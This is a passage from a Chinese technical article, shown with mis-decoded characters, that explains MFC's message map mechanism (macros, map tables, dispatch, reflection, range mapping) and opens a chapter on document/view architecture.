            <span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>è¿™ç§æ¨¡å¼å­˜åœ¨å‡ ä¸ªæ˜¾è‘—é—®é¢˜ï¼š</p>
<ol>
<li><strong>ä»£ç è†¨èƒ€</strong>ï¼šéšç€æ¶ˆæ¯ç±»å‹çš„å¢åŠ ï¼Œswitch-caseè¯­å¥å˜å¾—å¼‚å¸¸åºå¤§ï¼Œä¸€ä¸ªæˆç†Ÿçš„åº”ç”¨ç¨‹åºå¯èƒ½å¤„ç†æ•°ç™¾ç§æ¶ˆæ¯ç±»å‹ï¼Œå¯¼è‡´ä»£ç å¯è¯»æ€§æ€¥å‰§ä¸‹é™ã€‚</li>
<li><strong>é«˜åº¦è€¦åˆ</strong>ï¼šæ‰€æœ‰æ¶ˆæ¯å¤„ç†é€»è¾‘é›†ä¸­åœ¨å•ä¸€å‡½æ•°ä¸­ï¼Œä¸åŒç±»å‹çš„æ¶ˆæ¯å¤„ç†ä»£ç ç›¸äº’äº¤ç»‡ï¼Œéš¾ä»¥æ¨¡å—åŒ–ã€‚</li>
<li><strong>ç»´æŠ¤å›°éš¾</strong>ï¼šæ·»åŠ æ–°æ¶ˆæ¯å¤„ç†æˆ–ä¿®æ”¹ç°æœ‰é€»è¾‘æ—¶ï¼Œéœ€è¦åœ¨åºå¤§çš„switch-caseç»“æ„ä¸­å®šä½ï¼Œå®¹æ˜“å¼•å…¥é”™è¯¯ã€‚</li>
</ol>
<h3 data-id="heading-2">äºŒã€MFCçš„è§£å†³æ–¹æ¡ˆï¼šé¢å‘å¯¹è±¡çš„æ¶ˆæ¯æ˜ å°„æœºåˆ¶</h3>
<p>MFCçš„æ¶ˆæ¯æ˜ å°„æœºåˆ¶æ˜¯å¯¹ä¸Šè¿°é—®é¢˜çš„é©å‘½æ€§æ”¹è¿›ã€‚å®ƒåŸºäºä¸¤ä¸ªæ ¸å¿ƒè®¾è®¡åŸåˆ™ï¼š</p>
<ol>
<li><strong>åˆ†æ•£å¤„ç†</strong>ï¼šå°†æ¶ˆæ¯å¤„ç†åˆ†æ•£åˆ°å„ä¸ªçª—å£ç±»ä¸­ï¼Œæ¯ä¸ªç±»åªå¤„ç†ä¸è‡ªå·±ç›¸å…³çš„æ¶ˆæ¯ã€‚</li>
<li><strong>ç¼–è¯‘æ—¶ç»‘å®š</strong>ï¼šé€šè¿‡å®åœ¨ç¼–è¯‘æ—¶å»ºç«‹æ¶ˆæ¯åˆ°å¤„ç†å‡½æ•°çš„æ˜ å°„å…³ç³»ï¼Œé¿å…è¿è¡Œæ—¶çš„ç±»å‹åˆ¤æ–­å¼€é”€ã€‚</li>
</ol>
<h4 data-id="heading-3">2.1 æ¶ˆæ¯æ˜ å°„çš„å®ç°æœºåˆ¶</h4>
<p>æ¶ˆæ¯æ˜ å°„çš„å®ç°ä¾èµ–äºä¸€ç»„ç²¾å¿ƒè®¾è®¡çš„å®å’Œé™æ€æ•°æ®ç»“æ„ã€‚ä»¥ä¸‹æ˜¯å…¶æ ¸å¿ƒå®ç°æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å…¸å‹çš„MFCç±»æ¶ˆæ¯æ˜ å°„å£°æ˜</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyWnd</span> : <span class="hljs-keyword">public</span> CWnd
{
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CMyWnd</span>();
    
<span class="hljs-keyword">protected</span>:
    <span class="hljs-comment">// æ¶ˆæ¯å¤„ç†å‡½æ•°å£°æ˜</span>
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnPaint</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnMouseMove</span><span class="hljs-params">(UINT nFlags, CPoint point)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnFileOpen</span><span class="hljs-params">()</span></span>;
    
    <span class="hljs-comment">// å…³é”®ï¼šå£°æ˜æ¶ˆæ¯æ˜ å°„</span>
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()
};

<span class="hljs-comment">// å®ç°æ–‡ä»¶ä¸­çš„æ¶ˆæ¯æ˜ å°„å®šä¹‰</span>
<span class="hljs-built_in">BEGIN_MESSAGE_MAP</span>(CMyWnd, CWnd)
    <span class="hljs-built_in">ON_WM_PAINT</span>()
    <span class="hljs-built_in">ON_WM_MOUSEMOVE</span>()
    <span class="hljs-built_in">ON_COMMAND</span>(ID_FILE_OPEN, &amp;CMyWnd::OnFileOpen)
<span class="hljs-built_in">END_MESSAGE_MAP</span>()
</code></pre>
<h4 data-id="heading-4">2.2 æ¶ˆæ¯æ˜ å°„è¡¨çš„å†…éƒ¨ç»“æ„</h4>
<p>å½“ç¼–è¯‘å™¨å¤„ç†ä¸Šè¿°ä»£ç æ—¶ï¼Œä¼šç”Ÿæˆç±»ä¼¼ä¸‹é¢çš„é™æ€æ•°æ®ç»“æ„ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ¶ˆæ¯æ˜ å°„è¡¨æ¡ç›®ç»“æ„ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">AFX_MSGMAP_ENTRY</span>
{
    UINT nMessage;      <span class="hljs-comment">// Windowsæ¶ˆæ¯ID</span>
    UINT nCode;         <span class="hljs-comment">// æ§ä»¶é€šçŸ¥ç æˆ–å…¶å®ƒ</span>
    UINT nID;           <span class="hljs-comment">// æ§ä»¶IDï¼ˆå‘½ä»¤æ¶ˆæ¯ç”¨ï¼‰</span>
    UINT nLastID;       <span class="hljs-comment">// æ§ä»¶IDèŒƒå›´ç»“æŸï¼ˆç”¨äºèŒƒå›´æ˜ å°„ï¼‰</span>
    UINT nSig;          <span class="hljs-comment">// å‡½æ•°ç­¾åç±»å‹</span>
    AFX_PMSG pfn;       <span class="hljs-comment">// æŒ‡å‘æˆå‘˜å‡½æ•°çš„æŒ‡é’ˆ</span>
};

<span class="hljs-comment">// ä¸ºCMyWndç±»ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„è¡¨</span>
<span class="hljs-type">static</span> <span class="hljs-type">const</span> AFX_MSGMAP_ENTRY _messageEntries[] =
{
    <span class="hljs-comment">// æ ‡å‡†Windowsæ¶ˆæ¯</span>
    { WM_PAINT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, AfxSig_vv, (AFX_PMSG)&amp;CMyWnd::OnPaint },
    { WM_MOUSEMOVE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, AfxSig_vwp, (AFX_PMSG)&amp;CMyWnd::OnMouseMove },
    
    <span class="hljs-comment">// å‘½ä»¤æ¶ˆæ¯</span>
    { WM_COMMAND, <span class="hljs-number">0</span>, ID_FILE_OPEN, ID_FILE_OPEN, AfxSig_vv, 
      (AFX_PMSG)&amp;CMyWnd::OnFileOpen },
      
    <span class="hljs-comment">// ç»“æŸæ ‡è®°</span>
    { <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, AfxSig_end, (AFX_PMSG)<span class="hljs-number">0</span> }
};
</code></pre>
<h4 data-id="heading-5">2.3 æ¶ˆæ¯æ´¾å‘æµç¨‹</h4>
<p>MFCæ¡†æ¶çš„æ¶ˆæ¯æ´¾å‘è¿‡ç¨‹éµå¾ªæ˜ç¡®çš„ç®—æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ä¼ªä»£ç å±•ç¤ºMFCæ¶ˆæ¯æ´¾å‘é€»è¾‘</span>
<span class="hljs-function">LRESULT <span class="hljs-title">CWnd::WindowProc</span><span class="hljs-params">(UINT message, WPARAM wParam, LPARAM lParam)</span>
</span>{
    <span class="hljs-comment">// 1. è·å–å½“å‰ç±»çš„æ¶ˆæ¯æ˜ å°„è¡¨</span>
    <span class="hljs-type">const</span> AFX_MSGMAP* pMessageMap = <span class="hljs-built_in">GetMessageMap</span>();
    
    <span class="hljs-comment">// 2. æ²¿ç€ç»§æ‰¿é“¾å‘ä¸ŠæŸ¥æ‰¾æ¶ˆæ¯å¤„ç†å‡½æ•°</span>
    <span class="hljs-keyword">while</span> (pMessageMap != <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-comment">// åœ¨å½“å‰ç±»çš„æ¶ˆæ¯æ˜ å°„è¡¨ä¸­æŸ¥æ‰¾</span>
        <span class="hljs-type">const</span> AFX_MSGMAP_ENTRY* pEntries = pMessageMap-&gt;lpEntries;
        
        <span class="hljs-keyword">for</span> (; pEntries-&gt;nSig != AfxSig_end; pEntries++)
        {
            <span class="hljs-keyword">if</span> (pEntries-&gt;nMessage == message)
            {
                <span class="hljs-comment">// æ‰¾åˆ°åŒ¹é…é¡¹ï¼Œè°ƒç”¨å¤„ç†å‡½æ•°</span>
                <span class="hljs-keyword">union</span> <span class="hljs-title class_">MessageMapFunctions</span> mmf;
                mmf.pfn = pEntries-&gt;pfn;
                
                <span class="hljs-comment">// æ ¹æ®å‡½æ•°ç­¾åè°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°</span>
                <span class="hljs-keyword">switch</span> (pEntries-&gt;nSig)
                {
                    <span class="hljs-keyword">case</span> AfxSig_vv:  <span class="hljs-comment">// void func(void)</span>
                        (<span class="hljs-keyword">this</span>-&gt;*mmf.pfn_vv)();
                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
                        
                    <span class="hljs-keyword">case</span> AfxSig_vwp: <span class="hljs-comment">// void func(UINT, CPoint)</span>
                        (<span class="hljs-keyword">this</span>-&gt;*mmf.pfn_vwp)(wParam, 
                                            <span class="hljs-built_in">CPoint</span>(<span class="hljs-built_in">GET_X_LPARAM</span>(lParam), 
                                                  <span class="hljs-built_in">GET_Y_LPARAM</span>(lParam)));
                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
                    <span class="hljs-comment">// æ›´å¤šå‡½æ•°ç­¾åå¤„ç†...</span>
                }
            }
        }
        
        <span class="hljs-comment">// 3. æœªæ‰¾åˆ°åˆ™ç»§ç»­åœ¨åŸºç±»ä¸­æŸ¥æ‰¾</span>
        pMessageMap = pMessageMap-&gt;pBaseMessageMap;
    }
    
    <span class="hljs-comment">// 4. æœªæ‰¾åˆ°ä»»ä½•å¤„ç†å‡½æ•°ï¼Œè°ƒç”¨é»˜è®¤çª—å£è¿‡ç¨‹</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProc</span>(message, wParam, lParam);
}
</code></pre>
<h3 data-id="heading-6">ä¸‰ã€æ¶ˆæ¯æ˜ å°„çš„åˆ†ç±»ä¸é«˜çº§ç‰¹æ€§</h3>
<h4 data-id="heading-7">3.1 å››ç±»æ¶ˆæ¯åŠå…¶å¤„ç†æ–¹å¼</h4>
<p>MFCå°†Windowsæ¶ˆæ¯ç³»ç»Ÿæ€§åœ°åˆ†ä¸ºå››ç±»ï¼Œæ¯ç±»æœ‰ä¸åŒçš„æ˜ å°„å®å’Œå¤„ç†æ¨¡å¼ï¼š</p>








































<table><thead><tr><th>æ¶ˆæ¯ç±»å‹</th><th>å…¸å‹ç¤ºä¾‹</th><th>æ˜ å°„å®</th><th>å¤„ç†å‡½æ•°ç‰¹å¾</th><th>åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>æ ‡å‡†Windowsæ¶ˆæ¯</strong></td><td>WM_PAINT, WM_SIZE</td><td><code>ON_WM_XXXX()</code></td><td>å›ºå®šç­¾åï¼Œå¦‚<code>OnPaint()</code></td><td>çª—å£ç»˜åˆ¶ã€å¤§å°è°ƒæ•´ç­‰åŸºç¡€æ“ä½œ</td></tr><tr><td><strong>å‘½ä»¤æ¶ˆæ¯</strong></td><td>èœå•ç‚¹å‡»ã€å·¥å…·æ æŒ‰é’®</td><td><code>ON_COMMAND(id, func)</code></td><td>æ— å‚æ•°voidå‡½æ•°</td><td>ç”¨æˆ·å‘½ä»¤å“åº”</td></tr><tr><td><strong>æ§ä»¶é€šçŸ¥æ¶ˆæ¯</strong></td><td>æŒ‰é’®ç‚¹å‡»é€šçŸ¥ã€åˆ—è¡¨é¡¹é€‰æ‹©</td><td><code>ON_NOTIFY(code, id, func)</code></td><td>æ¥æ”¶NMHDRç»“æ„ä½“</td><td>å¤æ‚æ§ä»¶äº¤äº’</td></tr><tr><td><strong>åå°„æ¶ˆæ¯</strong></td><td>WM_CTLCOLOR, WM_DRAWITEM</td><td><code>ON_WM_CTLCOLOR_REFLECT()</code></td><td>å­æ§ä»¶è‡ªæˆ‘å¤„ç†</td><td>æ§ä»¶è‡ªå®šä¹‰ç»˜åˆ¶</td></tr></tbody></table>
<h4 data-id="heading-8">3.2 æ¶ˆæ¯åå°„æœºåˆ¶</h4>
<p>æ¶ˆæ¯åå°„æ˜¯MFCä¸­ä¸€ä¸ªå·§å¦™çš„è®¾è®¡ï¼Œå®ƒå…è®¸å­æ§ä»¶å¤„ç†é€šå¸¸ç”±çˆ¶çª—å£å¤„ç†çš„æ¶ˆæ¯ã€‚è¿™ç§æœºåˆ¶é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ï¼š</p>
<ol>
<li>çˆ¶çª—å£æ”¶åˆ°å­æ§ä»¶çš„é€šçŸ¥æ¶ˆæ¯ï¼ˆå¦‚WM_CTLCOLORï¼‰</li>
<li>MFCæ¡†æ¶æ£€æŸ¥å­æ§ä»¶æ˜¯å¦èƒ½å¤„ç†åå°„æ¶ˆæ¯</li>
<li>å¦‚æœèƒ½ï¼Œå°†æ¶ˆæ¯åå°„å›å­æ§ä»¶</li>
<li>å­æ§ä»¶åœ¨è‡ªå·±çš„æ¶ˆæ¯æ˜ å°„è¡¨ä¸­å¤„ç†åå°„æ¶ˆæ¯</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è‡ªå®šä¹‰æŒ‰é’®ç±»å¤„ç†åå°„æ¶ˆæ¯çš„ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyButton</span> : <span class="hljs-keyword">public</span> CButton
{
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">afx_msg HBRUSH <span class="hljs-title">CtlColor</span><span class="hljs-params">(CDC* pDC, UINT nCtlColor)</span></span>;
};

<span class="hljs-built_in">BEGIN_MESSAGE_MAP</span>(CMyButton, CButton)
    <span class="hljs-built_in">ON_WM_CTLCOLOR_REFLECT</span>()  <span class="hljs-comment">// åå°„æ¶ˆæ¯å¤„ç†</span>
<span class="hljs-built_in">END_MESSAGE_MAP</span>()

<span class="hljs-function">HBRUSH <span class="hljs-title">CMyButton::CtlColor</span><span class="hljs-params">(CDC* pDC, UINT nCtlColor)</span>
</span>{
    <span class="hljs-comment">// æŒ‰é’®è‡ªè¡Œå†³å®šèƒŒæ™¯è‰²ï¼Œè€Œä¸æ˜¯ç”±å¯¹è¯æ¡†ç»Ÿä¸€æ§åˆ¶</span>
    pDC-&gt;<span class="hljs-built_in">SetTextColor</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>));  <span class="hljs-comment">// çº¢è‰²æ–‡å­—</span>
    pDC-&gt;<span class="hljs-built_in">SetBkColor</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>));  <span class="hljs-comment">// é»„è‰²èƒŒæ™¯</span>
    
    <span class="hljs-function"><span class="hljs-type">static</span> CBrush <span class="hljs-title">yellowBrush</span><span class="hljs-params">(RGB(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>))</span></span>;
    <span class="hljs-keyword">return</span> yellowBrush;
}
</code></pre>
<h4 data-id="heading-9">3.3 æ¶ˆæ¯èŒƒå›´æ˜ å°„</h4>
<p>å¯¹äºå¤„ç†ä¸€ç³»åˆ—è¿ç»­IDçš„ç›¸ä¼¼å‘½ä»¤ï¼ŒMFCæä¾›äº†æ¶ˆæ¯èŒƒå›´æ˜ å°„æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å¤„ç†IDä»ID_TOOL_BUTTON_FIRSTåˆ°ID_TOOL_BUTTON_LASTçš„æ‰€æœ‰å·¥å…·æ æŒ‰é’®</span>
<span class="hljs-built_in">BEGIN_MESSAGE_MAP</span>(CMyView, CView)
    <span class="hljs-built_in">ON_COMMAND_RANGE</span>(ID_TOOL_BUTTON_FIRST, ID_TOOL_BUTTON_LAST, OnToolButtonClicked)
<span class="hljs-built_in">END_MESSAGE_MAP</span>()

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnToolButtonClicked</span><span class="hljs-params">(UINT nID)</span>
</span>{
    <span class="hljs-comment">// æ ¹æ®å…·ä½“IDæ‰§è¡Œç›¸åº”æ“ä½œ</span>
    <span class="hljs-type">int</span> buttonIndex = nID - ID_TOOL_BUTTON_FIRST;
    <span class="hljs-comment">// å¤„ç†é€»è¾‘...</span>
}
</code></pre>
<h3 data-id="heading-10">å››ã€æ¶ˆæ¯æ˜ å°„çš„æ€§èƒ½ä¸è®¾è®¡æƒè¡¡</h3>
<h4 data-id="heading-11">4.1 æ€§èƒ½åˆ†æ</h4>
<p>MFCæ¶ˆæ¯æ˜ å°„æœºåˆ¶åœ¨æ€§èƒ½ä¸Šåšå‡ºäº†ä»¥ä¸‹æƒè¡¡ï¼š</p>
<ol>
<li><strong>ç©ºé—´æ¢æ—¶é—´</strong>ï¼šä¸ºæ¯ä¸ªçª—å£ç±»ç”Ÿæˆé™æ€æ¶ˆæ¯æ˜ å°„è¡¨ï¼Œå ç”¨é¢å¤–å†…å­˜ï¼Œä½†é¿å…äº†è¿è¡Œæ—¶çš„åŠ¨æ€æŸ¥æ‰¾å¼€é”€ã€‚</li>
<li><strong>çº¿æ€§æŸ¥æ‰¾</strong>ï¼šæ¶ˆæ¯æ˜ å°„è¡¨é€šå¸¸è¾ƒå°ï¼Œçº¿æ€§æŸ¥æ‰¾æ•ˆç‡å¯æ¥å—ã€‚å¯¹äºæœ‰å¤§é‡æ¶ˆæ¯å¤„ç†çš„å¤§å‹ç±»ï¼ŒæŸ¥æ‰¾æ•ˆç‡å¯èƒ½æˆä¸ºç“¶é¢ˆã€‚</li>
<li><strong>ç»§æ‰¿é“¾æŸ¥æ‰¾</strong>ï¼šå½“æ¶ˆæ¯åœ¨å½“å‰ç±»æœªæ‰¾åˆ°æ—¶ï¼Œéœ€è¦æ²¿ç»§æ‰¿é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œè¿™å¢åŠ äº†å¤„ç†æœªå¤„ç†æ¶ˆæ¯çš„å¼€é”€ã€‚</li>
</ol>
<h4 data-id="heading-12">4.2 ä¸æ›¿ä»£æ–¹æ¡ˆçš„å¯¹æ¯”</h4>
<p>ä¸å…¶å®ƒæ¡†æ¶çš„æ¶ˆæ¯/äº‹ä»¶å¤„ç†æœºåˆ¶ç›¸æ¯”ï¼š</p>








































<table><thead><tr><th>æœºåˆ¶</th><th>ä»£è¡¨æ¡†æ¶</th><th>å®ç°æ–¹å¼</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td><strong>æ¶ˆæ¯æ˜ å°„</strong></td><td>MFC</td><td>ç¼–è¯‘æ—¶é™æ€ç»‘å®šï¼Œçº¿æ€§æŸ¥æ‰¾</td><td>ç±»å‹å®‰å…¨ï¼Œç¼–è¯‘æ—¶æ£€æŸ¥</td><td>ä¸å¤Ÿçµæ´»ï¼Œç»§æ‰¿é“¾æŸ¥æ‰¾å¼€é”€</td></tr><tr><td><strong>è™šå‡½æ•°è¡¨</strong></td><td>æ—©æœŸOWL</td><td>æ¯ä¸ªæ¶ˆæ¯å¯¹åº”è™šå‡½æ•°</td><td>ç›´æ¥è°ƒç”¨ï¼Œæ€§èƒ½é«˜</td><td>è™šå‡½æ•°è¡¨è†¨èƒ€ï¼ŒäºŒè¿›åˆ¶å…¼å®¹æ€§å·®</td></tr><tr><td><strong>ä¿¡å·æ§½</strong></td><td>Qt</td><td>è¿è¡Œæ—¶è¿æ¥ï¼Œå­—ç¬¦ä¸²åŒ¹é…</td><td>é«˜åº¦çµæ´»ï¼Œè·¨çº¿ç¨‹å®‰å…¨</td><td>è¿è¡Œæ—¶å¼€é”€ï¼Œç±»å‹å®‰å…¨æ£€æŸ¥å¼±</td></tr><tr><td><strong>å§”æ‰˜/äº‹ä»¶</strong></td><td>.NET</td><td>å¤šæ’­å§”æ‰˜ï¼Œå¼•ç”¨è®¡æ•°</td><td>ç±»å‹å®‰å…¨ï¼Œæ”¯æŒå¤šè®¢é˜…è€…</td><td>åƒåœ¾å›æ”¶ä¾èµ–ï¼Œéå®æ—¶ç³»ç»Ÿå¯èƒ½ä¸é€‚åˆ</td></tr></tbody></table>
<h3 data-id="heading-13">äº”ã€ç°ä»£æ¡†æ¶ä¸­çš„æ¶ˆæ¯æ˜ å°„é—äº§</h3>
<p>è™½ç„¶MFCæœ¬èº«å·²ä¸å†æ˜¯ä¸»æµå¼€å‘æ¡†æ¶ï¼Œä½†å…¶æ¶ˆæ¯æ˜ å°„çš„æ€æƒ³å½±å“äº†åç»­ä¼—å¤šUIæ¡†æ¶ï¼š</p>
<ol>
<li><strong>.NET WinForms</strong>ï¼šäº‹ä»¶å¤„ç†æ¨¡å‹å€Ÿé‰´äº†æ¶ˆæ¯æ˜ å°„çš„å¯¹è±¡åŒ–æ€æƒ³</li>
<li><strong>WPF/UWP</strong>ï¼šè·¯ç”±äº‹ä»¶æ¦‚å¿µå¯ä»¥è§†ä¸ºæ¶ˆæ¯æ˜ å°„çš„è¿›åŒ–å½¢å¼</li>
<li><strong>Qtä¿¡å·æ§½</strong>ï¼šè™½ç„¶å®ç°æœºåˆ¶ä¸åŒï¼Œä½†è§£å†³çš„é—®é¢˜åŸŸé«˜åº¦ç›¸ä¼¼</li>
</ol>
<p>åœ¨ç°ä»£C++ UIå¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°ç±»ä¼¼çš„æ¶ˆæ¯å¤„ç†æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ç°ä»£C++ UIæ¡†æ¶ä¸­çš„ç±»ä¼¼æ¨¡å¼ï¼ˆæ¦‚å¿µç¤ºä¾‹ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ModernButton</span> : <span class="hljs-keyword">public</span> UIWidget
{
    <span class="hljs-comment">// å£°æ˜äº‹ä»¶å¤„ç†å™¨</span>
    EventHandler&lt;<span class="hljs-built_in">void</span>()&gt; onClick;
    
    <span class="hljs-comment">// è¿æ¥äº‹ä»¶</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setupEventHandlers</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-comment">// ç±»ä¼¼äºMFCçš„æ¶ˆæ¯æ˜ å°„ï¼Œä½†æ›´çµæ´»</span>
        onMouseDown += [<span class="hljs-keyword">this</span>](MouseEvent e) { <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">handleMouseDown</span>(e); };
        onClick += []() { <span class="hljs-comment">/* å¤„ç†ç‚¹å‡» */</span> };
    }
};
</code></pre>
<h3 data-id="heading-14">å…­ã€æ€»ç»“ï¼šæ¶ˆæ¯æ˜ å°„çš„è®¾è®¡å“²å­¦</h3>
<p>MFCæ¶ˆæ¯æ˜ å°„æœºåˆ¶çš„æ ¸å¿ƒä»·å€¼åœ¨äºå®ƒæˆåŠŸåœ°å°†Windows APIçš„è¿‡ç¨‹å¼æ¶ˆæ¯å¤„ç†è½¬åŒ–ä¸ºé¢å‘å¯¹è±¡çš„èŒƒå¼ã€‚è¿™ä¸€è½¬åŒ–åŸºäºä»¥ä¸‹è®¾è®¡å“²å­¦ï¼š</p>
<ol>
<li><strong>å…³æ³¨ç‚¹åˆ†ç¦»</strong>ï¼šä¸åŒçª—å£ç±»åªå¤„ç†è‡ªå·±çš„æ¶ˆæ¯ï¼Œç¬¦åˆå•ä¸€èŒè´£åŸåˆ™ã€‚</li>
<li><strong>ç¼–è¯‘æ—¶å®‰å…¨</strong>ï¼šé€šè¿‡å®åœ¨ç¼–è¯‘æ—¶å»ºç«‹æ˜ å°„ï¼Œæ—©æœŸå‘ç°ç±»å‹ä¸åŒ¹é…é”™è¯¯ã€‚</li>
<li><strong>æ¡†æ¶é€æ˜æ€§</strong>ï¼šå¼€å‘è€…åªéœ€å…³æ³¨å¤„ç†å‡½æ•°æœ¬èº«ï¼Œå¤æ‚çš„æ¶ˆæ¯è·¯ç”±ç”±æ¡†æ¶å¤„ç†ã€‚</li>
</ol>
<p>ç„¶è€Œï¼Œè¿™ä¸€æœºåˆ¶ä¹Ÿæœ‰å…¶å†å²å±€é™æ€§ï¼Œç‰¹åˆ«æ˜¯ä¸ç°ä»£åå°„å’Œå§”æ‰˜æœºåˆ¶ç›¸æ¯”ï¼Œå®ƒç¼ºä¹è¶³å¤Ÿçš„çµæ´»æ€§å’Œè¡¨è¾¾èƒ½åŠ›ã€‚ç†è§£MFCæ¶ˆæ¯æ˜ å°„ä¸ä»…æœ‰åŠ©äºç»´æŠ¤é—ç•™ä»£ç ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œå®ƒå±•ç¤ºäº†æ¡†æ¶è®¾è®¡è€…å¦‚ä½•é€šè¿‡æŠ½è±¡å’Œå°è£…æ¥ç®¡ç†å¹³å°APIçš„å¤æ‚æ€§ï¼Œè¿™ä¸€è®¾è®¡æ€ç»´å¯¹ä»Šå¤©çš„è½¯ä»¶å¼€å‘ä¾ç„¶å…·æœ‰å¯ç¤ºæ„ä¹‰ã€‚</p>
<h2 data-id="heading-15">ç¬¬äºŒç« ï¼šMFCæ–‡æ¡£/è§†å›¾æ¶æ„â€”â€”æ•°æ®ä¸ç•Œé¢çš„åˆ†ç¦»å®è·µ</h2>
<h3 data-id="heading-16">ä¸€ã€è®¾è®¡èµ·æºï¼šä»å•ä½“åº”ç”¨åˆ°æ¨¡å—åŒ–æ¶æ„çš„æ¼”è¿›</h3>
<p>åœ¨æ—©æœŸçš„Windowsåº”ç”¨ç¨‹åºä¸­ï¼Œä¸€ä¸ªæ™®éçš„é—®é¢˜æ˜¯æ•°æ®ç®¡ç†ã€ç”¨æˆ·ç•Œé¢å’Œä¸šåŠ¡é€»è¾‘é«˜åº¦è€¦åˆã€‚ä»¥ç®€å•çš„æ–‡æœ¬ç¼–è¾‘å™¨ä¸ºä¾‹ï¼Œä¼ ç»Ÿè®¾è®¡å°†æ–‡ä»¶æ“ä½œã€æ–‡æœ¬æ˜¾ç¤ºå’Œç”¨æˆ·è¾“å…¥å¤„ç†å…¨éƒ¨æ··æ‚åœ¨çª—å£è¿‡ç¨‹ä¸­ï¼Œå¯¼è‡´ä»£ç éš¾ä»¥ç»´æŠ¤å’Œæ‰©å±•ã€‚</p>
<p>MFCæ–‡æ¡£/è§†å›¾æ¶æ„çš„æå‡ºï¼Œæ˜¯ä¸ºäº†è§£å†³è¿™ç§â€œå¤§æ³¥çƒâ€æ¶æ„é—®é¢˜ã€‚è¯¥æ¶æ„çš„æ ¸å¿ƒæ€æƒ³å€Ÿé‰´äº†è½¯ä»¶å·¥ç¨‹ä¸­çš„<strong>æ¨¡å‹-è§†å›¾-æ§åˆ¶å™¨ï¼ˆMVCï¼‰æ¨¡å¼</strong>ï¼Œä½†æ ¹æ®Windowså¹³å°çš„ç‰¹ç‚¹å’ŒC++è¯­è¨€çš„ç‰¹æ€§è¿›è¡Œäº†è°ƒæ•´å’Œä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-17">äºŒã€æ¶æ„ç»„æˆï¼šå››å¤§æ ¸å¿ƒç»„ä»¶çš„ååŒå·¥ä½œ</h3>
<p>æ–‡æ¡£/è§†å›¾æ¶æ„ç”±å››ä¸ªæ ¸å¿ƒç±»æ„æˆï¼Œå®ƒä»¬å„è‡ªæ‰¿æ‹…æ˜ç¡®çš„èŒè´£ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ¶æ„æ ¸å¿ƒç±»å…³ç³»ç¤ºæ„ä»£ç </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CDocument</span>;  <span class="hljs-comment">// æ•°æ®ç®¡ç†å±‚</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CView</span>;      <span class="hljs-comment">// æ•°æ®æ˜¾ç¤ºä¸äº¤äº’å±‚  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CFrameWnd</span>;  <span class="hljs-comment">// çª—å£å®¹å™¨å±‚</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CDocTemplate</span>; <span class="hljs-comment">// å·¥å‚ä¸åè°ƒå±‚</span>

<span class="hljs-comment">// åº”ç”¨ç¨‹åºåˆå§‹åŒ–æ—¶çš„å…¸å‹è®¾ç½®</span>
<span class="hljs-function">BOOL <span class="hljs-title">CMyApp::InitInstance</span><span class="hljs-params">()</span>
</span>{
